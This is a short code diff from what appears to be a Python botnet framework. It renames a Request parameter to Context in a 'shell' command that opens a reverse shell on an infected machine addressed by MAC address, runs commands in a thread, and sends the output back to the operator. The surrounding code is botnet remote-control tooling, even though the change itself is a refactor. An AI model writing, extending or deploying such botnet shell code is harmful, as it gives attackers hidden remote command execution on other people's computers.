@@ -4,11 +4,11 @@ import threading
 import subprocess
 
 
-from .. import BotNet, Request
+from .. import BotNet, Context
 
 
 @BotNet.default_script(script_version="0.0.2")
-def shell(request: Request) -> str:
+def shell(context: Context) -> str:
     """
     `[mac-address] /shell` -> open shell session
     or
@@ -25,12 +25,12 @@ def shell(request: Request) -> str:
     special condition:
         `/shell cd [path]` -> run python change directory, not run orginal cd command \n
     """
-    engine = request.engine
+    engine = context.engine
 
-    if len(request.command) > 0:
-        res = __runcommand_in_thread(request.command, engine)
+    if len(context.command) > 0:
+        res = __runcommand_in_thread(context.command, engine)
         if res != None:
-            engine.send(res, request.system_info(minimal=True))
+            engine.send(res, context.system_info(minimal=True))
         return
 
     repeat = 0
@@ -38,7 +38,7 @@ def shell(request: Request) -> str:
     sleep_time = 2
     exit_code = "TIME_OUT"
 
-    engine.send(f"start reverse shell\nfor EXIT send `\exit`", request.system_info())
+    engine.send(f"start reverse shell\nfor EXIT send `\exit`", context.system_info())
 
     while repeat < time_out:
 
